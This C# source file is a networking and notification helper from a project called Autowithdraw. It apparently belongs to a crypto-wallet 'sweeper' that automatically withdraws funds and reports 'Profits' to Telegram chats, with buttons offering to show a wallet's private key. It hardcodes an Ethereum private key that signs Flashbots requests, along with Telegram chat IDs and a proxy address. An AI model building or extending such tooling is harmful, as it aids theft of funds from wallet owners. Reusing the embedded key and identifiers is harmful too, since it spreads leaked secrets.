using Autowithdraw.Global.Common;
using Nethereum.Hex.HexConvertors.Extensions;
using Nethereum.Signer;
using Nethereum.Util;
using Nethereum.Web3.Accounts;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;

namespace Autowithdraw.Global
{
    internal class Network
    {
        public static List<string> LastTG = new List<string>();

        public static T Get<T>(string url) => JsonSerializer.Deserialize<T>(Get(url));

        public static string Get(string url)
        {
            HttpWebRequest httpWRequest = (HttpWebRequest)WebRequest.Create(url);
            httpWRequest.Method = "GET";
            HttpWebResponse httpWResponse = (HttpWebResponse)httpWRequest.GetResponse();
            StreamReader sr = new StreamReader(httpWResponse.GetResponseStream(), Encoding.UTF8);
            return sr.ReadToEnd();
        }

        public static T Post<T>(string url, string data)
        {
            HttpWebRequest httpWRequest = (HttpWebRequest)WebRequest.Create(url);
            httpWRequest.Method = "POST";
            byte[] byteArray = Encoding.UTF8.GetBytes(data);
            httpWRequest.ContentType = "application/x-www-form-urlencoded";
            httpWRequest.ContentLength = byteArray.Length;

            using (Stream dataStream = httpWRequest.GetRequestStream())
            {
                dataStream.Write(byteArray, 0, byteArray.Length);
            }

            HttpWebResponse httpWResponse = (HttpWebResponse)httpWRequest.GetResponse();
            StreamReader sr = new StreamReader(httpWResponse.GetResponseStream(), Encoding.UTF8);
            return JsonSerializer.Deserialize<T>(sr.ReadToEnd());
        }

        public static string Post(string content, string url)
        {
            var ecKey = new EthECKey("c62ed8574172e62077ff531603c1c948be37443438399efd960a975c25610653");
            var Account = new Account(ecKey);
            var hash = Sha3Keccack.Current.CalculateHash(content).HexToByteArray();
            var signer = new EthereumMessageSigner();
            var request = (HttpWebRequest)WebRequest.Create(url);

            var data = Encoding.UTF8.GetBytes(content);

            request.Timeout = 5000;
            //request.Proxy = new WebProxy("65.108.200.53", 4444);
            request.Method = "POST";
            request.ContentType = "application/json";
            request.ContentLength = data.Length;
            request.Headers.Add("X-Flashbots-Signature", $"{Account.Address}:{signer.EncodeUTF8AndSign(hash.ToHex(true), ecKey)}");
            //Logger.Debug($"{Account.Address}:{signer.EncodeUTF8AndSign(hash.ToHex(true), ecKey)}");

            using (var stream = request.GetRequestStream())
            {
                stream.Write(data, 0, data.Length);
            }

            var response = (HttpWebResponse)request.GetResponse();

            return new StreamReader(response.GetResponseStream()).ReadToEnd();
        }

        public static async Task SendTelegram(
            string Notification,
            string ContractAddress = "",
            int ChainID = 0,
            bool checkBalance = false,
            bool isNative = false,
            bool isTransaction = false)
        {
            if (LastTG.Contains(Notification)) return;
            LastTG.Add(Notification);
            try
            {
                ITelegramBotClient Bot = isTransaction
                    ? Settings.BotTransaction.Bot
                    : Settings.Profits.Bot;
                var reply = new InlineKeyboardMarkup(new[]
                {
                    new[]
                    {
                        InlineKeyboardButton.WithCallbackData("🔄 Check balance"),
                        InlineKeyboardButton.WithCallbackData("🔑 Private Key")
                    },
                    new[]
                    {
                        InlineKeyboardButton.WithCallbackData("🤫 Flashbots")
                    },
                    Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress) ?
                    new[]
                    {
                        InlineKeyboardButton.WithCallbackData("🔰 Trusted ✅")
                    } : new[]
                    {
                        InlineKeyboardButton.WithCallbackData("🔰 Trusted"),
                        InlineKeyboardButton.WithCallbackData("⛔ Scam")
                    }
                });

                if (isNative)
                    reply = new InlineKeyboardMarkup(new[]
                {
                    new[]
                    {
                        InlineKeyboardButton.WithCallbackData("🔑 Private Key")
                    }
                });

                await Bot.SendTextMessageAsync("5599916114", Notification, replyMarkup: checkBalance || isNative ? reply : null, parseMode: ParseMode.Html);

                if (Bot == Settings.BotTransaction.Bot)
                    await Bot.SendTextMessageAsync("-4094775814", Notification, replyMarkup: checkBalance || isNative ? reply : null, parseMode: ParseMode.Html);
                else
                    await Bot.SendTextMessageAsync("-1001836638477", Notification, replyMarkup: checkBalance || isNative ? reply : null, parseMode: ParseMode.Html);
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }
    }
}
